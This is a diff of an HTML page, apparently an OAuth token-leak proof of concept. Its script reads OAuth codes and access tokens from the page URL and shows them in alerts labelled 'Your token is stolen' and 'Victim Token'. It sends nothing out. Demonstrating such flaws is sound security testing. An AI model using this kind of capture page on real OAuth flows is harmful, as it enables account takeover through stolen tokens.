@@ -1,1 +1,32 @@
-<h1>success bro</h1>
+
+<script>
+    (function () {
+        try {
+            const query = new URLSearchParams(window.location.search);
+            const code = query.get('code');
+            const privyCode = query.get('privy_oauth_code');
+
+            if (code) {
+                alert(`Your token is stolen: ${code}`);
+            }
+
+            if (privyCode) {
+                alert(`Your token is stolen: ${privyCode}`);
+            }
+
+            const hash = window.location.hash.substring(1);
+            const hashParams = Object.fromEntries(
+                hash.split('&').map(pair => pair.split('='))
+            );
+
+            if (hashParams['access_token']) {
+                alert(`Victim Token: ${hashParams['access_token']}`);
+            }
+        } catch (err) {
+            console.error('Error parsing tokens:', err);
+        }
+    })();
+</script>
+
+<h1>Testing OAuth here! Should have your token by now...</h1>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"93f9b33efe933e55","version":"2025.4.0-1-g37f21b1","r":1,"token":"71854d9a1b5340da9dbbbfe73e290a5a","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
